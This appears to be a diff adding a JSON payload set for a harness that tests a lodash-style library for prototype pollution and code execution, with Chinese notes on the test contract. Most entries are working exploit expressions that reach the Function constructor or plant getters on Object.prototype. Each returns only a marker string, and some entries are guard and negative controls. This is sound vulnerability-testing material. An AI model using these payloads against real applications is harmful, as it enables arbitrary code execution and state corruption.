@@ -1,0 +1,149 @@
+{
+  "schema": "vhv-payloads/1",
+  "note": [
+    "载荷契约：expr 是一段 JS 表达式，可用变量 `_`（目标库）与 `M`（每次运行随机的 marker 串）。",
+    "judge 语义统一成字符串包含，避免每个载荷各写一套判定逻辑：",
+    "  expect=marker     ：expr 的返回值里出现 'VHV'+M  → 命中",
+    "  expect=no_marker  ：返回值里不出现 'VHV'+M     → 通过（用于阴性对照与'被拦住'类断言）",
+    "为什么必须一载荷一进程：原型链污染是全局副作用，同进程复用会让后一个载荷吃到前一个的残留。",
+    "origin 字段记录载荷是手工写的还是由 locate.js 的矩阵自动提示的 —— 这是衡量'自动化带来多少增量'的依据。"
+  ],
+  "payloads": [
+    {
+      "id": "invoke_rce_arr",
+      "api": "invoke",
+      "class": "rce",
+      "origin": "locate",
+      "expect": "marker",
+      "expr": "_.invoke({}, ['__proto__','constructor','constructor'], 'return '+JSON.stringify('VHV'+M))()"
+    },
+    {
+      "id": "invoke_rce_str",
+      "api": "invoke",
+      "class": "rce",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "_.invoke({}, '__proto__.constructor.constructor', 'return '+JSON.stringify('VHV'+M))()"
+    },
+    {
+      "id": "invokeMap_rce",
+      "api": "invokeMap",
+      "class": "rce",
+      "origin": "locate",
+      "expect": "marker",
+      "expr": "_.invokeMap([{}], ['__proto__','constructor','constructor'], 'return '+JSON.stringify('VHV'+M))[0]()"
+    },
+    {
+      "id": "method_rce",
+      "api": "method",
+      "class": "rce",
+      "origin": "locate",
+      "expect": "marker",
+      "expr": "_.method(['__proto__','constructor','constructor'], 'return '+JSON.stringify('VHV'+M))({})()"
+    },
+    {
+      "id": "methodOf_rce",
+      "api": "methodOf",
+      "class": "rce",
+      "origin": "locate",
+      "expect": "marker",
+      "expr": "_.methodOf({}, 'return '+JSON.stringify('VHV'+M))(['__proto__','constructor','constructor'])()"
+    },
+    {
+      "id": "lazy_invokeMap_rce",
+      "api": "invokeMap(lazy)",
+      "class": "rce",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "_([{}]).invokeMap(['__proto__','constructor','constructor'], 'return '+JSON.stringify('VHV'+M)).value()[0]()"
+    },
+    {
+      "id": "chain_invokeMap_rce",
+      "api": "invokeMap(chain)",
+      "class": "rce",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "_.chain([{}]).invokeMap(['__proto__','constructor','constructor'], 'return '+JSON.stringify('VHV'+M)).value()[0]()"
+    },
+    {
+      "id": "invoke_pollution_getter_arr",
+      "api": "invoke",
+      "class": "pollution",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{_.invoke({}, ['__proto__','__defineGetter__'], M, function(){return 'VHV'+M;});return String(({})[M]);})()"
+    },
+    {
+      "id": "invoke_pollution_getter_str",
+      "api": "invoke",
+      "class": "pollution",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{_.invoke({}, '__proto__.__defineGetter__', M, function(){return 'VHV'+M;});return String(({})[M]);})()"
+    },
+    {
+      "id": "invokeMap_pollution",
+      "api": "invokeMap",
+      "class": "pollution",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{_.invokeMap([{}], ['__proto__','__defineGetter__'], M, function(){return 'VHV'+M;});return String(({})[M]);})()"
+    },
+    {
+      "id": "method_pollution",
+      "api": "method",
+      "class": "pollution",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{_.method(['__proto__','__defineGetter__'], M, function(){return 'VHV'+M;})({});return String(({})[M]);})()"
+    },
+    {
+      "id": "methodOf_pollution",
+      "api": "methodOf",
+      "class": "pollution",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{_.methodOf({}, M, function(){return 'VHV'+M;})(['__proto__','__defineGetter__']);return String(({})[M]);})()"
+    },
+    {
+      "id": "unset_same_path_blocked",
+      "api": "unset",
+      "class": "guard-control",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{const r=_.unset({}, ['__proto__','__defineGetter__']);return r===false?'VHV'+M:'NOT_BLOCKED';})()"
+    },
+    {
+      "id": "set_same_path_blocked",
+      "api": "set",
+      "class": "guard-control",
+      "origin": "manual",
+      "expect": "no_marker",
+      "expr": "(()=>{_.set({}, ['__proto__', M], 'VHV'+M);return String(({})[M]);})()"
+    },
+    {
+      "id": "ctrl_invoke_normal",
+      "api": "invoke",
+      "class": "control",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "_.invoke({m: function(){return 'VHV'+M;}}, 'm')"
+    },
+    {
+      "id": "ctrl_set_get_normal",
+      "api": "set",
+      "class": "control",
+      "origin": "manual",
+      "expect": "marker",
+      "expr": "(()=>{_.set({}, 'a.b.c', 'VHV'+M);return _.get({a:{b:{c:'VHV'+M}}}, 'a.b.c');})()"
+    },
+    {
+      "id": "ctrl_no_pollution_normal_path",
+      "api": "invoke",
+      "class": "control",
+      "origin": "manual",
+      "expect": "no_marker",
+      "expr": "(()=>{_.invoke({a:{m:function(){return 1;}}}, ['a','m']);return String(({})[M]);})()"
+    }
+  ]
+}
